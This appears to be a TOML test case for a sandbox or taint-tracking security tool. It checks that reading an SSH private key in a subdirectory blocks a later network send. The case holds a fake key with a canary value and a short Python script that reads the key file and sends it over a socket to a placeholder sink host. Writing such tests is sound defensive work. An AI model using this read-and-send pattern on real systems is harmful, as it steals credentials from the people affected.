# The secret is an SSH private key, matched by the `**/id_rsa*` class rather
# than a dotenv name, and it sits in a subdirectory. Reading it must taint the
# principal just as a .env read does, so the following egress is refused.
name = "secret-by-key-name-exfil"
kind = "attack"
policy = "recommended"

[[files]]
path = "deploy/id_rsa"
contents = "-----BEGIN KEY-----\n{CANARY}\n-----END KEY-----\n"

[[files]]
path = "send.py"
contents = """
import socket
secret = open("deploy/id_rsa", "rb").read()
s = socket.socket()
try:
    s.connect(("{SINK_HOST}", {SINK_PORT}))
    s.sendall(secret)
except PermissionError:
    pass
"""

[[steps]]
shell = 0
run = "python3 send.py"
expect = "any"

[oracle]
encodings = ["raw", "base64", "hex"]
